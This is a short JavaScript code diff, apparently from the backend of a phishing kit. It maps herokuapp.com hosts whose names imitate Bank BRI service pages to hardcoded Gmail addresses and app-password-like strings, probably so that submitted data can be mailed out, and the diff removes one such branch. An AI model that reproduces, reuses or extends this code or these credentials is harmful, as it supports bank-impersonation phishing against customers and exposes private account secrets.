@@ -20,11 +20,6 @@ export default function handler(req, res) {
     } else if(url == 'bri-pelayanan.herokuapp.com'){
         email = 'pukiayam5123@gmail.com';
         pass = 'joyxbannkfmypmzx';
-
-    } else if(url == 'bri-perubahantarif.herokuapp.com'){
-        email = 'pooopss117@gmail.com';
-        pass = 'nkcgdjrpogrmqprm';
-
     }
     else {
         email = 'bripembukaanrekening@gmail.com';
